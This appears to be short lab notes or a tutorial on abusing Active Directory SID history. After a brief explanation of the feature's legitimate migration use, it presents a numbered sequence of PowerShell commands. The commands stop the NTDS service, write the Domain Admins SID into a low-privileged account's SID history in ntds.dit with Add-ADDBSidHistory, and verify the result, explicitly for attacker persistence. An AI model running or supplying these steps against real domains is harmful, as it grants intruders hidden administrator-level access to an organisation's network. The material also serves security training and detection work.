The Security IDentifiers (SIDs) have been discussed before. But for a recap, SIDs are used to track the security principal and the account's access when connecting to resources. 
There is, however, an interesting attribute on accounts called the SID history.
The legitimate use case of SID history is to enable access for an account to effectively be cloned to another. 
This becomes useful when an organisation is busy performing an AD migration as it allows users to retain access to the original domain while they are being migrated to the new one. 
In the new domain, the user would have a new SID, but we can add the user's existing SID in the SID history, which will still allow them to access resources in the previous domain using their new account. 
While SID history is good for migrations, we, as attackers, can also abuse this feature for persistence.


//How to Forge SID History(go from Lowpriv account to Domain Admin)
1)Check that our Low Account have no SID History: 
```
Get-ADUser <your ad username> -properties sidhistory,memberof
```
2)Find SID of Domain Admins group: 
```
Get-ADGroup "Domain Admins"
```
3)Stop the NDTS service: 
```
Stop-Service -Name ntds -force
```
4)Add the D.A. SID to our Low Account into NDTS DB: 
```
Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit
```
5)Start back NDTS service: 
```
Start-Service -Name ntds
```
6)Check that Low account have the D.A SID: 
```
Get-ADUser aaron.jones -Properties sidhistory 
```
7)You should be good to go
